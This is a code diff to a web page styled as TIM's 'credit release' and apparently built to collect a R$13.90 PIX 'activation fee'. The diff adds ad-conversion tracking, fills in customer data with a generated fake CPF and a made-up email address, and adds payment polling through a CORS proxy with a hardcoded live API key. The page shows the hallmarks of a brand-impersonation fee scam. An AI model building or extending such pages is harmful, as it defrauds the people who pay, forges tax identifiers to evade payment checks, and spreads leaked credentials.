@@ -5,6 +5,14 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>TIM - Liberação de Créditos</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <script src="../js/tracking.js"></script>
+    <!-- Utmify Pixel & UTMs Tracking -->
+    <script
+      src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+      data-utmify-prevent-subids
+      async
+      defer
+    ></script>
     <style>
         * { box-sizing: border-box; font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; outline: none; }
         body { background-color: #0114C4; margin: 0; padding: 0; color: #333; }
@@ -331,19 +339,33 @@
             return (digits.length === 10 || digits.length === 11) ? digits : '11999999999';
         }
 
+        let currentTaxaCustomer = null;
+
         async function criarPixTaxaMultiPlataforma() {
             const cleanPhone = normalizePhoneClient(phone || '');
             const amount = 1390;
+            const generatedCpf = generateValidCpfClient();
+            const trackingParams = typeof window.gvdesenrolaMergeTracking === 'function' ? window.gvdesenrolaMergeTracking() : {};
+            const customerObj = {
+                name: 'Cliente Recarga TIM',
+                email: 'cliente.' + cleanPhone + '@recargatim.com.br',
+                phone: cleanPhone,
+                taxId: generatedCpf,
+                cpf: generatedCpf
+            };
+            currentTaxaCustomer = customerObj;
+
             const xpayPayload = {
                 amount: amount,
                 expiresIn: 900,
                 externalId: 'tim_taxa_' + cleanPhone + '_' + Date.now(),
                 customer: {
-                    name: 'Cliente Recarga TIM',
-                    email: 'cliente.' + cleanPhone + '@recargatim.com.br',
-                    phone: cleanPhone,
-                    taxId: generateValidCpfClient()
-                }
+                    name: customerObj.name,
+                    email: customerObj.email,
+                    phone: customerObj.phone,
+                    taxId: customerObj.taxId
+                },
+                metadata: trackingParams
             };
 
             const proxyEndpoints = [
@@ -369,6 +391,9 @@
                             const txId = charge.id;
                             const brCode = charge.brCode || '';
                             const brCodeBase64 = charge.brCodeBase64 || '';
+                            if (typeof window.notificarUtmify === 'function') {
+                                window.notificarUtmify('waiting_payment', txId, charge.amount || amount, customerObj, 'Taxa de Ativação', 'prod_taxa');
+                            }
                             return {
                                 success: true,
                                 data: {
@@ -395,11 +420,16 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ 
                     phone: phone || '', 
-                    cpf: urlParams.get('cpf') || '', 
-                    value: '13,90' 
+                    cpf: urlParams.get('cpf') || generatedCpf, 
+                    value: '13,90',
+                    tracking: trackingParams
                 })
             });
-            return await response.json();
+            const apiJson = await response.json();
+            if (apiJson?.success && apiJson?.data?.transactionId && typeof window.notificarUtmify === 'function') {
+                window.notificarUtmify('waiting_payment', apiJson.data.transactionId, apiJson.data.amount || amount, customerObj, 'Taxa de Ativação', 'prod_taxa');
+            }
+            return apiJson;
         }
 
         // Generate PIX for the fee
@@ -434,6 +464,7 @@
                     }
                     
                     startTimer();
+                    startTaxaPolling(currentTaxaTxId);
                     setTimeout(() => {
                         pixSection.scrollIntoView({ behavior: 'smooth', block: 'start' });
                     }, 300);
@@ -460,6 +491,59 @@
             };
             setInterval(updateTimer, 1000);
             updateTimer();
+        }
+
+        function startTaxaPolling(txId) {
+            if (!txId) return;
+            const pollInterval = setInterval(async () => {
+                try {
+                    let isPaid = false;
+                    const statusEndpoints = [
+                        '/xpay-proxy/charge/' + encodeURIComponent(txId),
+                        'https://proxy.corsfix.com/?sdk=1&url=' + encodeURIComponent('https://api.xpaybrasil.com/v1/charge/' + encodeURIComponent(txId))
+                    ];
+                    let checkedViaProxy = false;
+                    for (const endpoint of statusEndpoints) {
+                        try {
+                            const proxyResp = await fetch(endpoint, {
+                                method: 'GET',
+                                headers: {
+                                    'Content-Type': 'application/json',
+                                    'X-API-KEY': 'cpk_live_ex84lopcp2xexagmazz6za11'
+                                }
+                            });
+                            const ct = proxyResp.headers.get('content-type') || '';
+                            if (proxyResp.ok && ct.includes('application/json')) {
+                                checkedViaProxy = true;
+                                const json = await proxyResp.json();
+                                const charge = json.data || json;
+                                const pStatus = String(charge.paymentStatus || '').toUpperCase();
+                                const cStatus = String(charge.status || '').toUpperCase();
+                                if (pStatus === 'PAID' || pStatus === 'RECIEVED' || pStatus === 'RECEIVED' || pStatus === 'APPROVED' || cStatus === 'COMPLETED' || cStatus === 'PAID') {
+                                    isPaid = true;
+                                }
+                                break;
+                            }
+                        } catch (innerErr) {}
+                    }
+                    if (!checkedViaProxy) {
+                        try {
+                            const resp = await fetch('/api/status/' + encodeURIComponent(txId));
+                            const statusData = await resp.json();
+                            const st = (statusData.data?.status || statusData.status || '').toString().toUpperCase();
+                            if (st === 'PAID' || st === 'APPROVED') {
+                                isPaid = true;
+                            }
+                        } catch (e) {}
+                    }
+                    if (isPaid) {
+                        clearInterval(pollInterval);
+                        if (typeof window.notificarUtmify === 'function') {
+                            window.notificarUtmify('paid', txId, 1390, currentTaxaCustomer || { name: 'Cliente Recarga TIM', phone: phone || '' }, 'Taxa de Ativação', 'prod_taxa');
+                        }
+                    }
+                } catch (e) {}
+            }, 8000);
         }
 
         function copyPix() {
